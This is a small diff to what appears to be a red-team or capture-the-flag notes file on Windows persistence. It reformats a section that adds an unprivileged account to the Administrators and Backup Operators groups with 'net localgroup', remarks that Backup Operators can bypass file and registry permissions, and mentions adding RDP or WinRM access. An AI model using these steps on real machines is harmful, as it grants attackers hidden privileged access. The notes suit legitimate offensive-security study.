@@ -3,9 +3,13 @@ Having an administrator's credential would be the easiest way to achieve persist
 
 
 ## Assign Group Memberships
+- **Administrator Group**:
 ```ps1
 # make it part of the Administrators group But this looks too suspicious
 net localgroup administrators <Unpriv-username> /add
+```
+- **BackupOperators Group**:
+```ps1
 #  make it part of the BackupOperators group. Users in this group will be allowed to read/write any file or registry key, ignoring DACL
 net localgroup "Backup Operators" <Unpriv-username> /add
 # it still cannot RDP or WinRM back to the machine, we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups
